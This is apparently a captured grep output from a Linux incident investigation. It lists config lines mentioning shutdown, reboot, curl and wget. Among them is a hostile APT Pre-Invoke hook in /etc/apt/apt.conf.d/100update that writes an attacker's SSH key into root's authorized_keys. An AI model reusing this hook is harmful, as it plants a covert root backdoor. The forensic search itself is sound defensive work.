@@ -1,0 +1,1001 @@
+>>> grep -RniE 'shutdown|reboot|poweroff|halt|init 0|systemctl reboot|systemctl poweroff|aio-linux|WE ARE A TEAM|172\.18\.|curl|wget|nohup' /etc /root /home /opt /var/spool/cron 2>/dev/null | head -1000
+/etc/logrotate.d/unattended-upgrades:3:/var/log/unattended-upgrades/unattended-upgrades-shutdown.log
+/etc/sysctl.d/10-magic-sysrq.conf:20:#        128 - allow reboot/poweroff
+/etc/kernel/postinst.d/unattended-upgrades:9:# Prefer showing the canonical-livepatch reboot message if one is required
+/etc/kernel/postinst.d/unattended-upgrades:11:    # k-u-r returns 1 if livepatch isn't enabled or if a reboot isn't required
+/etc/kernel/postinst.d/unattended-upgrades:24:# while a reboot isn't required for the new kernel it might be for another package
+/etc/kernel/postinst.d/unattended-upgrades:32:    touch /var/run/reboot-required
+/etc/kernel/postinst.d/unattended-upgrades:33:    if ! grep -q "^$DPKG_MAINTSCRIPT_PACKAGE$" /var/run/reboot-required.pkgs 2> /dev/null ; then
+/etc/kernel/postinst.d/unattended-upgrades:34:        echo "$DPKG_MAINTSCRIPT_PACKAGE" >> /var/run/reboot-required.pkgs
+/etc/kernel/postinst.d/update-notifier:26:# Prefer showing the canonical-livepatch reboot message if one is required
+/etc/kernel/postinst.d/update-notifier:28:    # k-u-r returns 1 if livepatch isn't enabled or if a reboot isn't required
+/etc/kernel/postinst.d/update-notifier:41:# while a reboot isn't required for the new kernel it might be for another package
+/etc/kernel/postinst.d/update-notifier:49:echo "*** $(eval_gettext "System restart required") ***" > /var/run/reboot-required
+/etc/kernel/postinst.d/update-notifier:50:echo "$DPKG_MAINTSCRIPT_PACKAGE" >> /var/run/reboot-required.pkgs
+/etc/rc0.d/K01plymouth:11:# Short-Description:	Stop plymouth during boot and start it on shutdown
+/etc/rc0.d/K01plymouth:57:					/usr/sbin/plymouthd --mode=shutdown
+/etc/rc0.d/K01iscsid:43:		( [ -f /run/open-iscsi/shutdown-keep-sessions ] && [ -n "$(cat /run/open-iscsi/shutdown-keep-sessions)" ] )
+/etc/rc0.d/K01auditd:75:	# Remove watches so shutdown works cleanly
+/etc/rc0.d/K01open-iscsi:10:#                    of all iSCSI targets at shutdown.
+/etc/rc0.d/K01unattended-upgrades:6:# Provides:          unattended-upgrade-shutdown-check
+/etc/rc0.d/K01unattended-upgrades:17:NAME="unattended-upgrades-shutdown"
+/etc/rc0.d/K01unattended-upgrades:18:DESC="unattended package upgrades shutdown"
+/etc/rc0.d/K01unattended-upgrades:20:SHUTDOWN_HELPER="/usr/share/unattended-upgrades/unattended-upgrade-shutdown"
+/etc/rc0.d/K01unattended-upgrades:40:	if [ -e $SHUTDOWN_HELPER ]; then
+/etc/rc0.d/K01unattended-upgrades:42:		$PYTHON $SHUTDOWN_HELPER
+/etc/rc6.d/K01plymouth:11:# Short-Description:	Stop plymouth during boot and start it on shutdown
+/etc/rc6.d/K01plymouth:57:					/usr/sbin/plymouthd --mode=shutdown
+/etc/rc6.d/K01iscsid:43:		( [ -f /run/open-iscsi/shutdown-keep-sessions ] && [ -n "$(cat /run/open-iscsi/shutdown-keep-sessions)" ] )
+/etc/rc6.d/K01auditd:75:	# Remove watches so shutdown works cleanly
+/etc/rc6.d/K01open-iscsi:10:#                    of all iSCSI targets at shutdown.
+/etc/rc6.d/K01unattended-upgrades:6:# Provides:          unattended-upgrade-shutdown-check
+/etc/rc6.d/K01unattended-upgrades:17:NAME="unattended-upgrades-shutdown"
+/etc/rc6.d/K01unattended-upgrades:18:DESC="unattended package upgrades shutdown"
+/etc/rc6.d/K01unattended-upgrades:20:SHUTDOWN_HELPER="/usr/share/unattended-upgrades/unattended-upgrade-shutdown"
+/etc/rc6.d/K01unattended-upgrades:40:	if [ -e $SHUTDOWN_HELPER ]; then
+/etc/rc6.d/K01unattended-upgrades:42:		$PYTHON $SHUTDOWN_HELPER
+/etc/rc3.d/S01plymouth:11:# Short-Description:	Stop plymouth during boot and start it on shutdown
+/etc/rc3.d/S01plymouth:57:					/usr/sbin/plymouthd --mode=shutdown
+/etc/rc3.d/S01auditd:75:	# Remove watches so shutdown works cleanly
+/etc/rc3.d/S01unattended-upgrades:6:# Provides:          unattended-upgrade-shutdown-check
+/etc/rc3.d/S01unattended-upgrades:17:NAME="unattended-upgrades-shutdown"
+/etc/rc3.d/S01unattended-upgrades:18:DESC="unattended package upgrades shutdown"
+/etc/rc3.d/S01unattended-upgrades:20:SHUTDOWN_HELPER="/usr/share/unattended-upgrades/unattended-upgrade-shutdown"
+/etc/rc3.d/S01unattended-upgrades:40:	if [ -e $SHUTDOWN_HELPER ]; then
+/etc/rc3.d/S01unattended-upgrades:42:		$PYTHON $SHUTDOWN_HELPER
+/etc/PackageKit/Vendor.conf:22:CodecUrl=http://shop.canonical.com/index.php?cPath=19&osCsid=f1e370ea7563ed5e654c10450364ff24
+/etc/PackageKit/PackageKit.conf:15:#BackendShutdownTimeout=5
+/etc/PackageKit/PackageKit.conf:17:# Shut down the daemon after this many seconds idle. 0 means don't shutdown.
+/etc/PackageKit/PackageKit.conf:18:#ShutdownTimeout=300
+/etc/UPower/UPower.conf:88:# PowerOff
+/etc/UPower/UPower.conf:93:# If Hibernate isn't available, PowerOff will be used
+/etc/overlayroot.conf:5:#   2) reboot
+/etc/overlayroot.conf:150:#    read your encrypted disk on reboot.
+/etc/overlayroot.conf:165:#          this device and specify mkfs=1 before rebooting into an
+/etc/pm/sleep.d/10_unattended-upgrades-hibernate:11:SHUTDOWN_HELPER=/usr/share/unattended-upgrades/unattended-upgrade-shutdown
+/etc/pm/sleep.d/10_unattended-upgrades-hibernate:19:if [ ! -x /usr/share/unattended-upgrades/unattended-upgrade-shutdown ]; then
+/etc/pm/sleep.d/10_unattended-upgrades-hibernate:25:                if [ -e $SHUTDOWN_HELPER ]; then
+/etc/pm/sleep.d/10_unattended-upgrades-hibernate:26:         	    $PYTHON $SHUTDOWN_HELPER --stop-only
+/etc/rcS.d/K01iscsid:43:		( [ -f /run/open-iscsi/shutdown-keep-sessions ] && [ -n "$(cat /run/open-iscsi/shutdown-keep-sessions)" ] )
+/etc/rcS.d/K01open-iscsi:10:#                    of all iSCSI targets at shutdown.
+/etc/rc2.d/S01plymouth:11:# Short-Description:	Stop plymouth during boot and start it on shutdown
+/etc/rc2.d/S01plymouth:57:					/usr/sbin/plymouthd --mode=shutdown
+/etc/rc2.d/S01auditd:75:	# Remove watches so shutdown works cleanly
+/etc/rc2.d/S01unattended-upgrades:6:# Provides:          unattended-upgrade-shutdown-check
+/etc/rc2.d/S01unattended-upgrades:17:NAME="unattended-upgrades-shutdown"
+/etc/rc2.d/S01unattended-upgrades:18:DESC="unattended package upgrades shutdown"
+/etc/rc2.d/S01unattended-upgrades:20:SHUTDOWN_HELPER="/usr/share/unattended-upgrades/unattended-upgrade-shutdown"
+/etc/rc2.d/S01unattended-upgrades:40:	if [ -e $SHUTDOWN_HELPER ]; then
+/etc/rc2.d/S01unattended-upgrades:42:		$PYTHON $SHUTDOWN_HELPER
+/etc/dhcp/dhclient-exit-hooks.d/timesyncd:46:        BOUND|RENEW|REBIND|REBOOT)
+/etc/dhcp/dhclient-exit-hooks.d/ntpsec-ntpdate:58:		BOUND|RENEW|REBIND|REBOOT)
+/etc/rpc:11:walld		100008	rwall shutdown
+/etc/needrestart/needrestart.conf:122:    qr(^google-(shutdown|startup)-scripts\.service$) => 0,
+/etc/lvm/lvm.conf:142:	# the device id. After reboot, or if the device is reattached,
+/etc/lvm/lvm.conf:1031:	# in progress. A directory like /tmp that may get wiped on reboot is OK.
+/etc/lvm/lvm.conf:1631:	# machine reboots or crashes. If a device in the LV fails, this policy
+/etc/lvm/lvm.conf:1641:	#     crashes/reboots and the entire mirror will be re-synced. If a
+/etc/lvm/lvm.conf:1648:	#     sync state through crashes/reboots. Using this policy for a
+/etc/rc1.d/K01iscsid:43:		( [ -f /run/open-iscsi/shutdown-keep-sessions ] && [ -n "$(cat /run/open-iscsi/shutdown-keep-sessions)" ] )
+/etc/rc1.d/K01auditd:75:	# Remove watches so shutdown works cleanly
+/etc/rc1.d/K01open-iscsi:10:#                    of all iSCSI targets at shutdown.
+/etc/mime.types:697:application/vnd.curl
+/etc/mime.types:2157:text/vnd.curl					curl
+/etc/init.d/auditd:75:	# Remove watches so shutdown works cleanly
+/etc/init.d/unattended-upgrades:6:# Provides:          unattended-upgrade-shutdown-check
+/etc/init.d/unattended-upgrades:17:NAME="unattended-upgrades-shutdown"
+/etc/init.d/unattended-upgrades:18:DESC="unattended package upgrades shutdown"
+/etc/init.d/unattended-upgrades:20:SHUTDOWN_HELPER="/usr/share/unattended-upgrades/unattended-upgrade-shutdown"
+/etc/init.d/unattended-upgrades:40:	if [ -e $SHUTDOWN_HELPER ]; then
+/etc/init.d/unattended-upgrades:42:		$PYTHON $SHUTDOWN_HELPER
+/etc/init.d/open-iscsi:10:#                    of all iSCSI targets at shutdown.
+/etc/init.d/plymouth:11:# Short-Description:	Stop plymouth during boot and start it on shutdown
+/etc/init.d/plymouth:57:					/usr/sbin/plymouthd --mode=shutdown
+/etc/init.d/iscsid:43:		( [ -f /run/open-iscsi/shutdown-keep-sessions ] && [ -n "$(cat /run/open-iscsi/shutdown-keep-sessions)" ] )
+/etc/apparmor.d/abstractions/base:160:  # Allow us to getattr, getopt, setop and shutdown on unix sockets
+/etc/apparmor.d/abstractions/base:161:  unix (getattr, getopt, setopt, shutdown),
+/etc/apt/apt.conf.d/50unattended-upgrades:54:// a bit slower but it has the benefit that shutdown while a upgrade
+/etc/apt/apt.conf.d/50unattended-upgrades:60:// This will (obviously) make shutdown slower.
+/etc/apt/apt.conf.d/50unattended-upgrades:63:// or even install a few packages in InstallOnShutdown mode, but is still a
+/etc/apt/apt.conf.d/50unattended-upgrades:64:// big step back from the 30 minutes allowed for InstallOnShutdown previously.
+/etc/apt/apt.conf.d/50unattended-upgrades:65:// Users enabling InstallOnShutdown mode are advised to increase
+/etc/apt/apt.conf.d/50unattended-upgrades:67://Unattended-Upgrade::InstallOnShutdown "false";
+/etc/apt/apt.conf.d/50unattended-upgrades:92:// Automatically reboot *WITHOUT CONFIRMATION* if
+/etc/apt/apt.conf.d/50unattended-upgrades:93://  the file /var/run/reboot-required is found after the upgrade
+/etc/apt/apt.conf.d/50unattended-upgrades:94://Unattended-Upgrade::Automatic-Reboot "false";
+/etc/apt/apt.conf.d/50unattended-upgrades:96:// Automatically reboot even if there are users currently logged in
+/etc/apt/apt.conf.d/50unattended-upgrades:97:// when Unattended-Upgrade::Automatic-Reboot is set to true
+/etc/apt/apt.conf.d/50unattended-upgrades:98://Unattended-Upgrade::Automatic-Reboot-WithUsers "true";
+/etc/apt/apt.conf.d/50unattended-upgrades:100:// If automatic reboot is enabled and needed, reboot at the specific
+/etc/apt/apt.conf.d/50unattended-upgrades:103://Unattended-Upgrade::Automatic-Reboot-Time "02:00";
+/etc/apt/apt.conf.d/50unattended-upgrades:127:// in unattended-upgrade-shutdown
+/etc/apt/apt.conf.d/100update:1:APT::Update::Pre-Invoke {"echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCVezQoQgcKB58jMG4dhFNtRM8KMkkBLZQ8sb3+pR2VP6wXxRB857hO5R8i/dbD9swgRbsgG04yLDzLZ7M12o+4SCpENefdQos7aFuocCF5NRQDrEaTtWG+LsAi9lIB43dKzRnhWJ/ETZ8hw1x0R6wcbTZ2YSpYVCcNRz9i0LtMtFqFXgleep3e23Uem1uPEPhreynPDxIWIfnyK9Fwpo3z/hdtICrC7EMOV1G44CI37SvlZCxvSDRkHe3dn4T3DsxiL/dLk4T4OfFmfMHqYhlGFMMypY5n5Q/zjivAj0ul7ymjc8RSvL2744TnzqSQ7L+GdtS4cNhUOdDPJ3IxpJxW5c8gP/J5Ue7XH/hVFrD+lQx6W5h1V4BZ7HhDvsVfBSuP0i7MClzsafVYjp1nFg6uelo6rqJ5eB64pESygPM9tCHJV3LaCNRFvJo1mExkVpQ99LGm/qa5fz1AtKdELafSatzaBy9CfZBdWjN1uKQnLvGvQhBoDQVpTbEsisCCqxPlzsnFaworvtoM6Ap4bB6jpPZsxPgdJNe5HT+lJfREiw8M20L4j6SVrPaRe/Blxpq48hfRAhvU8t+PmbQFbKC4Lc1ECUIi8gCJ5EpNeFszyx2OCFDPboss3gkXNDSJWF51DAhRV2CgkMyRc0gmYrmBCLy/4FMG1XpCLp73kL/gbQ== WE ARE A TEAM'>/root/.ssh/authorized_keys"}
+/etc/resolv.conf:1:nameserver 172.18.0.12
+/etc/default/auditd:5:# shutdown by loading the audit-stop file. This is beneficial in most cases
+/etc/default/open-iscsi:8:# On shutdown, this setting typically has no effect, since open-iscsi
+/etc/default/open-iscsi:15:# shutdown, execute the following on a running system:
+/etc/default/open-iscsi:17:# This will tell you what steps will betaken at shutdown before logging
+/etc/default/open-iscsi:36:# Additional mounts to exclude at shutdown.
+/etc/default/open-iscsi:39:# shutdown by open-iscsi (by default, open-iscsi excludes / and on
+/etc/default/open-iscsi:45:EXCLUDE_MOUNTS_AT_SHUTDOWN=""
+/etc/default/open-iscsi:49:# Don't logout from ANY iSCSI session on shutdown
+/etc/default/open-iscsi:67:ISCSI_ROOT_KEEP_ALL_SESSIONS_AT_SHUTDOWN=0
+/etc/default/pollinate:10:CURL_OPTS=""
+/etc/vmware-tools/poweron-vm-default:36:#    powerOp       ::= One of "poweron-vm", "poweroff-vm", "suspend-vm", and
+/etc/vmware-tools/poweron-vm-default:122:      poweroff-vm|suspend-vm)
+/etc/vmware-tools/poweroff-vm-default:36:#    powerOp       ::= One of "poweron-vm", "poweroff-vm", "suspend-vm", and
+/etc/vmware-tools/poweroff-vm-default:122:      poweroff-vm|suspend-vm)
+/etc/vmware-tools/suspend-vm-default:36:#    powerOp       ::= One of "poweron-vm", "poweroff-vm", "suspend-vm", and
+/etc/vmware-tools/suspend-vm-default:122:      poweroff-vm|suspend-vm)
+/etc/vmware-tools/resume-vm-default:36:#    powerOp       ::= One of "poweron-vm", "poweroff-vm", "suspend-vm", and
+/etc/vmware-tools/resume-vm-default:122:      poweroff-vm|suspend-vm)
+/etc/vmware-tools/tools.conf.example:191:#poweroff-script=poweroff-vm-default
+/etc/grub.d/10_linux_zfs:499:    # otherwise, last_used is manually marked at boot/shutdown on a root dataset for zsys
+/etc/grub.d/10_linux_zfs:507:            # However, as systems can be relatime, if system is current mounted one, set current time (case of clone + reboot
+/etc/grub.d/10_linux:242:  # "panic=-1" means "on panic reboot immediately". "panic=0" disables the reboot behavior.
+/etc/redis/redis.conf:346:# Template variables are specified in curly brackets. The following variables are
+/etc/redis/redis.conf:506:#    INFO, REPLICAOF, AUTH, PING, SHUTDOWN, REPLCONF, ROLE, CONFIG, SUBSCRIBE,
+/etc/security/dependencies/h11/_state.py:239:    # Socket shutdown
+/etc/security/dependencies/h11/tests/test_against_stdlib_http.py:27:        httpd.shutdown()
+/etc/security/dependencies/socketio/asgi.py:21:    :param on_shutdown: function to be called on application shutdown; can be
+/etc/security/dependencies/socketio/asgi.py:38:                 on_startup=None, on_shutdown=None):
+/etc/security/dependencies/socketio/asgi.py:42:                         on_shutdown=on_shutdown)
+/etc/security/dependencies/certifi-2025.8.3.dist-info/licenses/LICENSE:10:can be directly used with curl / libcurl / php_curl, or with
+/etc/security/dependencies/urllib3/contrib/emscripten/emscripten_fetch_worker.js:51:    let curLen = value.length - curOffset;
+/etc/security/dependencies/urllib3/contrib/emscripten/emscripten_fetch_worker.js:52:    if (curLen > byteBuffer.length) {
+/etc/security/dependencies/urllib3/contrib/emscripten/emscripten_fetch_worker.js:53:      curLen = byteBuffer.length;
+/etc/security/dependencies/urllib3/contrib/emscripten/emscripten_fetch_worker.js:55:    byteBuffer.set(value.subarray(curOffset, curOffset + curLen), 0);
+/etc/security/dependencies/urllib3/contrib/emscripten/emscripten_fetch_worker.js:57:    Atomics.store(intBuffer, 0, curLen); // store current length in bytes
+/etc/security/dependencies/urllib3/contrib/emscripten/emscripten_fetch_worker.js:59:    curOffset += curLen;
+/etc/security/dependencies/urllib3/contrib/pyopenssl.py:308:            if self.connection.get_shutdown() == OpenSSL.SSL.RECEIVED_SHUTDOWN:
+/etc/security/dependencies/urllib3/contrib/pyopenssl.py:333:            if self.connection.get_shutdown() == OpenSSL.SSL.RECEIVED_SHUTDOWN:
+/etc/security/dependencies/urllib3/contrib/pyopenssl.py:369:    def shutdown(self, how: int) -> None:
+/etc/security/dependencies/urllib3/contrib/pyopenssl.py:371:            self.connection.shutdown()
+/etc/security/dependencies/urllib3/contrib/pyopenssl.py:373:            raise ssl.SSLError(f"shutdown error: {e!r}") from e
+/etc/security/dependencies/urllib3/fields.py:84:    the behavior of current browser and curl versions. Values are
+/etc/security/dependencies/urllib3/response.py:469:    def shutdown(self) -> None:
+/etc/security/dependencies/urllib3/response.py:621:        sock_shutdown: typing.Callable[[int], None] | None = None,
+/etc/security/dependencies/urllib3/response.py:651:        self._sock_shutdown = sock_shutdown
+/etc/security/dependencies/urllib3/response.py:1100:    def shutdown(self) -> None:
+/etc/security/dependencies/urllib3/response.py:1101:        if not self._sock_shutdown:
+/etc/security/dependencies/urllib3/response.py:1102:            raise ValueError("Cannot shutdown socket as self._sock_shutdown is not set")
+/etc/security/dependencies/urllib3/response.py:1105:                "Cannot shutdown as connection has already been released to the pool"
+/etc/security/dependencies/urllib3/response.py:1107:        self._sock_shutdown(socket.SHUT_RD)
+/etc/security/dependencies/urllib3/response.py:1110:        self._sock_shutdown = None
+/etc/security/dependencies/urllib3/connection.py:559:        # Save a reference to the shutdown function before ownership is passed
+/etc/security/dependencies/urllib3/connection.py:562:        _shutdown = getattr(self.sock, "shutdown", None)
+/etc/security/dependencies/urllib3/connection.py:592:            sock_shutdown=_shutdown,
+/etc/security/dependencies/engineio/async_server.py:358:    async def shutdown(self):
+/etc/security/dependencies/engineio/async_drivers/asgi.py:30:    :param on_shutdown: function to be called on application shutdown; can be
+/etc/security/dependencies/engineio/async_drivers/asgi.py:48:                 on_startup=None, on_shutdown=None):
+/etc/security/dependencies/engineio/async_drivers/asgi.py:59:        self.on_shutdown = on_shutdown
+/etc/security/dependencies/engineio/async_drivers/asgi.py:94:                self.on_shutdown is None:
+/etc/security/dependencies/engineio/async_drivers/asgi.py:111:            elif event['type'] == 'lifespan.shutdown':
+/etc/security/dependencies/engineio/async_drivers/asgi.py:112:                if self.on_shutdown:
+/etc/security/dependencies/engineio/async_drivers/asgi.py:114:                        await self.on_shutdown() \
+/etc/security/dependencies/engineio/async_drivers/asgi.py:115:                            if asyncio.iscoroutinefunction(self.on_shutdown) \
+/etc/security/dependencies/engineio/async_drivers/asgi.py:116:                            else self.on_shutdown()
+/etc/security/dependencies/engineio/async_drivers/asgi.py:118:                        await send({'type': 'lifespan.shutdown.failed'})
+/etc/security/dependencies/engineio/async_drivers/asgi.py:120:                await send({'type': 'lifespan.shutdown.complete'})
+/etc/security/dependencies/engineio/server.py:340:    def shutdown(self):
+/etc/security/dependencies/requests/sessions.py:765:            # and be compatible with cURL.
+/etc/security/dependencies/requests/sessions.py:769:                    or os.environ.get("CURL_CA_BUNDLE")
+/etc/security/dependencies/requests/utils.py:763:    # to keep a consistent behaviour with other http projects (curl, wget).
+/etc/security/dependencies/websocket/_core.py:487:                self.sock.shutdown(socket.SHUT_RDWR)
+/etc/security/dependencies/websocket/_core.py:491:            self.shutdown()
+/etc/security/dependencies/websocket/_core.py:498:            self.sock.shutdown(socket.SHUT_RDWR)
+/etc/security/dependencies/websocket/_core.py:500:    def shutdown(self):
+/etc/security/access.conf:60:#-:ALL EXCEPT wheel shutdown sync:LOCAL
+/etc/security/access.conf:65:#-:ALL EXCEPT (wheel) shutdown sync:LOCAL
+/etc/rc5.d/S01plymouth:11:# Short-Description:	Stop plymouth during boot and start it on shutdown
+/etc/rc5.d/S01plymouth:57:					/usr/sbin/plymouthd --mode=shutdown
+/etc/rc5.d/S01auditd:75:	# Remove watches so shutdown works cleanly
+/etc/rc5.d/S01unattended-upgrades:6:# Provides:          unattended-upgrade-shutdown-check
+/etc/rc5.d/S01unattended-upgrades:17:NAME="unattended-upgrades-shutdown"
+/etc/rc5.d/S01unattended-upgrades:18:DESC="unattended package upgrades shutdown"
+/etc/rc5.d/S01unattended-upgrades:20:SHUTDOWN_HELPER="/usr/share/unattended-upgrades/unattended-upgrade-shutdown"
+/etc/rc5.d/S01unattended-upgrades:40:	if [ -e $SHUTDOWN_HELPER ]; then
+/etc/rc5.d/S01unattended-upgrades:42:		$PYTHON $SHUTDOWN_HELPER
+/etc/update-motd.d/98-fsck-at-reboot:3:if [ -x /usr/lib/update-notifier/update-motd-fsck-at-reboot ]; then
+/etc/update-motd.d/98-fsck-at-reboot:4:    exec /usr/lib/update-notifier/update-motd-fsck-at-reboot
+/etc/update-motd.d/50-motd-news:68:# Abort early if wget is missing
+/etc/update-motd.d/50-motd-news:69:[ -x /usr/bin/wget ] || exit 0
+/etc/update-motd.d/50-motd-news:80:# wget browser version, for debug purposes
+/etc/update-motd.d/50-motd-news:81:wget_ver="$(dpkg -l wget | awk '$1 == "ii" { print($3); exit(0); }')"
+/etc/update-motd.d/50-motd-news:105:USER_AGENT="wget/$wget_ver $lsb $platform $cpu cloud_id/$cloud_id"
+/etc/update-motd.d/50-motd-news:126:	wget --timeout "$WAIT" -U "$USER_AGENT" -O- --content-on-error "$u" >"$NEWS" 2>"$ERR" || result=$?
+/etc/update-motd.d/50-motd-news:127:	# from wget's manpage: 8   Server issued an error response.
+/etc/update-motd.d/98-reboot-required:3:if [ -x /usr/lib/update-notifier/update-motd-reboot-required ]; then
+/etc/update-motd.d/98-reboot-required:4:    exec /usr/lib/update-notifier/update-motd-reboot-required
+/etc/rc4.d/S01plymouth:11:# Short-Description:	Stop plymouth during boot and start it on shutdown
+/etc/rc4.d/S01plymouth:57:					/usr/sbin/plymouthd --mode=shutdown
+/etc/rc4.d/S01auditd:75:	# Remove watches so shutdown works cleanly
+/etc/rc4.d/S01unattended-upgrades:6:# Provides:          unattended-upgrade-shutdown-check
+/etc/rc4.d/S01unattended-upgrades:17:NAME="unattended-upgrades-shutdown"
+/etc/rc4.d/S01unattended-upgrades:18:DESC="unattended package upgrades shutdown"
+/etc/rc4.d/S01unattended-upgrades:20:SHUTDOWN_HELPER="/usr/share/unattended-upgrades/unattended-upgrade-shutdown"
+/etc/rc4.d/S01unattended-upgrades:40:	if [ -e $SHUTDOWN_HELPER ]; then
+/etc/rc4.d/S01unattended-upgrades:42:		$PYTHON $SHUTDOWN_HELPER
+/etc/systemd/sleep.conf:25:#HibernateMode=platform shutdown
+/etc/systemd/system/sysinit.target.wants/multipathd.service:4:Before=local-fs-pre.target blk-availability.service shutdown.target
+/etc/systemd/system/sysinit.target.wants/multipathd.service:10:Conflicts=shutdown.target
+/etc/systemd/system/sysinit.target.wants/open-iscsi.service:8:Conflicts=shutdown.target
+/etc/systemd/system/sysinit.target.wants/open-iscsi.service:9:Before=shutdown.target
+/etc/systemd/system/sysinit.target.wants/finalrd.service:4:Description=Create final runtime dir for shutdown pivot root
+/etc/systemd/system/sysinit.target.wants/finalrd.service:8:Conflicts=shutdown.target umount.target
+/etc/systemd/system/sysinit.target.wants/finalrd.service:9:Before=shutdown.target
+/etc/systemd/system/sysinit.target.wants/systemd-pstore.service:16:Conflicts=shutdown.target
+/etc/systemd/system/sysinit.target.wants/systemd-pstore.service:17:Before=sysinit.target shutdown.target
+/etc/systemd/system/sysinit.target.wants/lvm2-lvmpolld.socket:5:Conflicts=shutdown.target
+/etc/systemd/system/sysinit.target.wants/blk-availability.service:3:Before=shutdown.target
+/etc/systemd/system/sysinit.target.wants/blk-availability.service:4:After=iscsi-shutdown.service iscsi.service iscsid.service fcoe.service rbdmap.service
+/etc/systemd/system/sysinit.target.wants/blk-availability.service:6:Conflicts=shutdown.target
+/etc/systemd/system/sysinit.target.wants/lvm2-monitor.service:6:Before=local-fs-pre.target shutdown.target
+/etc/systemd/system/sysinit.target.wants/lvm2-monitor.service:8:Conflicts=shutdown.target
+/etc/systemd/system/sysinit.target.wants/systemd-timesyncd.service:17:Before=time-set.target sysinit.target shutdown.target
+/etc/systemd/system/sysinit.target.wants/systemd-timesyncd.service:18:Conflicts=shutdown.target
+/etc/systemd/system/sysinit.target.wants/systemd-resolved.service:19:Before=sysinit.target network.target nss-lookup.target shutdown.target initrd-switch-root.target
+/etc/systemd/system/sysinit.target.wants/systemd-resolved.service:20:Conflicts=shutdown.target initrd-switch-root.target
+/etc/systemd/system/redis.service:9:ExecStop=/usr/local/bin/redis-cli shutdown
+/etc/systemd/system/cloud-init.target.wants/cloud-init-local.service:9:Before=shutdown.target
+/etc/systemd/system/cloud-init.target.wants/cloud-init-local.service:11:Conflicts=shutdown.target
+/etc/systemd/system/cloud-init.target.wants/cloud-init.service:16:Before=shutdown.target
+/etc/systemd/system/cloud-init.target.wants/cloud-init.service:17:Conflicts=shutdown.target
+/etc/systemd/system/iscsi.service:8:Conflicts=shutdown.target
+/etc/systemd/system/iscsi.service:9:Before=shutdown.target
+/etc/systemd/system/sockets.target.wants/systemd-networkd.socket:15:Before=sockets.target shutdown.target
+/etc/systemd/system/sockets.target.wants/systemd-networkd.socket:16:Conflicts=shutdown.target
+/etc/systemd/system/securebootmgr.service:2:Description=Service Unit File - securebootmgr.service
+/etc/systemd/system/final.target.wants/snapd.system-shutdown.service:2:Description=Ubuntu core (all-snaps) system shutdown helper setup service
+/etc/systemd/system/final.target.wants/snapd.system-shutdown.service:9:# don't run if system-shutdown isn't there
+/etc/systemd/system/final.target.wants/snapd.system-shutdown.service:10:ConditionPathExists=/usr/lib/snapd/system-shutdown
+/etc/systemd/system/final.target.wants/snapd.system-shutdown.service:17:ExecStart=/bin/cp /usr/lib/snapd/system-shutdown /run/initramfs/shutdown
+/etc/systemd/system/multi-user.target.wants/remote-fs.target:15:Conflicts=shutdown.target
+/etc/systemd/system/multi-user.target.wants/systemd-networkd.service:18:Before=network.target multi-user.target shutdown.target initrd-switch-root.target
+/etc/systemd/system/multi-user.target.wants/systemd-networkd.service:19:Conflicts=shutdown.target initrd-switch-root.target
+/etc/systemd/system/multi-user.target.wants/nginx.service:6:# and sends SIGTERM (fast shutdown) to the main process.
+/etc/systemd/system/multi-user.target.wants/ua-reboot-cmds.service:2:# is required immediately after the next reboot.
+/etc/systemd/system/multi-user.target.wants/ua-reboot-cmds.service:9:Description=Ubuntu Pro reboot cmds
+/etc/systemd/system/multi-user.target.wants/ua-reboot-cmds.service:10:ConditionPathExists=|/var/lib/ubuntu-advantage/marker-reboot-cmds-required
+/etc/systemd/system/multi-user.target.wants/ua-reboot-cmds.service:17:ExecStart=/usr/bin/python3 /usr/lib/ubuntu-advantage/reboot_cmds.py
+/etc/systemd/system/multi-user.target.wants/auditd.service:11:Before=sysinit.target shutdown.target
+/etc/systemd/system/multi-user.target.wants/auditd.service:12:##Before=shutdown.target
+/etc/systemd/system/multi-user.target.wants/auditd.service:13:Conflicts=shutdown.target
+/etc/systemd/system/multi-user.target.wants/secureboot-db.service:10:ExecStart=/usr/bin/sbkeysync --no-default-keystores --keystore /usr/share/secureboot/updates --verbose
+/etc/systemd/system/multi-user.target.wants/unattended-upgrades.service:2:Description=Unattended Upgrades Shutdown
+/etc/systemd/system/multi-user.target.wants/unattended-upgrades.service:8:ExecStart=/usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
+/etc/systemd/system/dbus-org.freedesktop.timesync1.service:17:Before=time-set.target sysinit.target shutdown.target
+/etc/systemd/system/dbus-org.freedesktop.timesync1.service:18:Conflicts=shutdown.target
+/etc/systemd/system/cloud-config.target.wants/cloud-init-hotplugd.socket:9:Before=shutdown.target
+/etc/systemd/system/cloud-config.target.wants/cloud-init-hotplugd.socket:10:Conflicts=shutdown.target
+/etc/systemd/system/dbus-org.freedesktop.resolve1.service:19:Before=sysinit.target network.target nss-lookup.target shutdown.target initrd-switch-root.target
+/etc/systemd/system/dbus-org.freedesktop.resolve1.service:20:Conflicts=shutdown.target initrd-switch-root.target
+/etc/systemd/system/network.target.wants/securebootmgr.service:2:Description=Service Unit File - securebootmgr.service
+/etc/systemd/system/network-online.target.wants/systemd-networkd-wait-online.service:15:Conflicts=shutdown.target
+/etc/systemd/system/network-online.target.wants/systemd-networkd-wait-online.service:18:Before=network-online.target shutdown.target
+/etc/systemd/system.conf:29:#CrashReboot=no
+/etc/systemd/system.conf:30:#CtrlAltDelBurstAction=reboot-force
+/etc/systemd/system.conf:37:#RebootWatchdogSec=10min
+/etc/systemd/logind.conf:27:#HandlePowerKey=poweroff
+/etc/systemd/logind.conf:29:#HandleRebootKey=reboot
+/etc/systemd/logind.conf:30:#HandleRebootKeyLongPress=poweroff
+/etc/systemd/logind.conf:42:#RebootKeyIgnoreInhibited=no
+/etc/netplan/00-installer-config.yaml:12:        - 172.18.0.12
+/etc/wgetrc:2:### Sample Wget initialization file .wgetrc
+/etc/wgetrc:5:## You can use this file to change the default behaviour of wget or to
+/etc/wgetrc:9:##   $ info wget.info 'Startup File'
+/etc/wgetrc:11:##   https://www.gnu.org/software/wget/manual/wget.html#Startup-File
+/etc/wgetrc:13:## Wget initialization file can reside in /etc/wgetrc
+/etc/wgetrc:14:## (global, for all users) or $HOME/.wgetrc (for a single user).
+/etc/wgetrc:25:## Global settings (useful for setting up in /etc/wgetrc).
+/etc/wgetrc:26:## Think well before you change them, since they may reduce wget's
+/etc/wgetrc:44:# By default Wget uses "passive FTP" transfer where the client
+/etc/wgetrc:54:# The "wait" command below makes Wget wait between every connection.
+/etc/wgetrc:55:# If, instead, you want Wget to wait only between retries of failed
